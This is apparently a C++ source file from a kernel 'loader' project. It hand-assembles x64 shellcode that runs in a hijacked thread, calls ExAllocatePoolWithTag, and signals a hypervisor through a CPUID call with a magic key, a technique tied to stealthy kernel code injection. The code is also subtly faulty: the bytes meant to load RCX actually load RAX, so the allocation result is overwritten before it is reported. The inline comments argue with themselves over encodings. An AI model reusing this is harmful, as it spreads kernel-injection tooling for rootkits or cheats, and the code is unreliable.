#include "shellcode.h"
#include "../crt/crt.h"
#include "../memory_manager/memory_manager.h" // For memory helper if needed

namespace loader {
namespace shellcode {

// Optimized shellcode to call ExAllocatePoolWithTag
// and return result via CPUID.
//
// Arguments:
// RCX = 0 (NonPagedPool)
// RDX = size
// R8 = tag
// call ExAllocatePoolWithTag
// mov rcx, 0x13371337 (Hypercall Magic)
// mov rdx, rax (Result Pointer)
// cpuid
//
// Since we hijack thread: no need to preserve volatile registers if we restore
// context fully via Hypervisor trap frame after CPUID.
//
// Total size: ~40 bytes
void generate_pool_allocation(uint8_t *buffer, uint32_t &size,
                              uint64_t ex_allocate_pool,
                              uint32_t allocation_size, uint32_t tag) {
  uint32_t idx = 0;

  // Prolog: Reserve shadow space (Windows 64 ABI requires 32 bytes)
  // Prolog: Reserve shadow space & ALIGN STACK (Critical for arbitrary hijack)
  // mov rbx, rsp (Save original RSP to non-volatile RBX)
  buffer[idx++] = 0x48;
  buffer[idx++] = 0x89; // mov r/m64, r64
  buffer[idx++] =
      0xE3; // rsp, rbx ? ModRM: 11 100 011 -> 11(Reg) 100(SP->AH?) No.
  // mov rbx, rsp:
  // REX.W 48
  // 89 (MOV r/m, r)
  // ModRM: 11 (Reg) 100 (RSP-Source) 011 (RBX-Dest) -> 11 100 011 = E3? No.
  // Src=RSP(4), Dst=RBX(3).
  // 11 100 011 -> E3?
  // Let's verify: 11 (Mode) 100 (RSP is reg 4) 011 (RBX is reg 3).
  // Yes, E3.

  // Actually, standard tool shows: 48 89 E3 for mov rbx, rsp.

  // and rsp, -16 (Align to 16 bytes)
  buffer[idx++] = 0x48;
  buffer[idx++] = 0x83;
  buffer[idx++] = 0xE4; // AND RSP
  buffer[idx++] = 0xF0; // -16 (0xF0 signed byte)

  // sub rsp, 0x20 (32 bytes shadow space)
  buffer[idx++] = 0x48;
  buffer[idx++] = 0x83;
  buffer[idx++] = 0xEC;
  buffer[idx++] = 0x20;

  // 1. Prepare argument 1 (RCX): NonPagedPool (0)
  // xor ecx, ecx
  buffer[idx++] = 0x31;
  buffer[idx++] = 0xC9;

  // 2. Prepare argument 2 (RDX): Size
  // mov edx, <size>
  buffer[idx++] = 0xBA;
  *(uint32_t *)&buffer[idx] = allocation_size;
  idx += 4;

  // 3. Prepare argument 3 (R8): Tag
  // mov r8d, <tag>
  buffer[idx++] = 0x41;
  buffer[idx++] = 0xB8;
  *(uint32_t *)&buffer[idx] = tag;
  idx += 4;

  // 4. Load Function Address
  // mov rax, <func>
  buffer[idx++] = 0x48;
  buffer[idx++] = 0xB8;
  *(uint64_t *)&buffer[idx] = ex_allocate_pool;
  idx += 8;

  // 5. Call Function
  // call rax
  buffer[idx++] = 0xFF;
  buffer[idx++] = 0xD0;

  // [FIX] Restore Stack from RBX
  // mov rsp, rbx
  buffer[idx++] = 0x48;
  buffer[idx++] = 0x89;
  buffer[idx++] =
      0xDC; // mov rsp, rbx (Src RBX=3, Dst RSP=4) -> 11 011 100 -> DC

  // 6. Report Result via Hypercall (CPUID)
  // mov rcx, 0x13371337 (Magic Value expected by handler)
  buffer[idx++] = 0x48;
  buffer[idx++] = 0xB8;
  *(uint64_t *)&buffer[idx] = 0x1337133713371337; // Magic Key
  idx += 8;

  // mov rdx, rax (Save result for hypervisor)
  buffer[idx++] = 0x48;
  buffer[idx++] = 0x89; // mov rdx, rax
  buffer[idx++] = 0xC2;

  // cpuid (Leaf set in RAX implicitly to whatever result was? No, we should set
  // RAX leaf) Actually, result is in RAX. We need to save it. Move result to
  // another register first? Let's use RDX for result passing. Set EAX to
  // specific leaf for Hypervisor identification. mov eax, <Hypercall Leaf>
  // (e.g., 0x5000)
  buffer[idx++] = 0xB8;
  *(uint32_t *)&buffer[idx] = 0x5000; // Leaf 0x5000
  idx += 4;

  // cpuid
  buffer[idx++] = 0x0F;
  buffer[idx++] = 0xA2;

  // Add infinite loop just in case handler doesn't catch it properly
  // although handler should advance RIP.
  // jmp $
  buffer[idx++] = 0xEB;
  buffer[idx++] = 0xFE;

  size = idx;
}

} // namespace shellcode
} // namespace loader
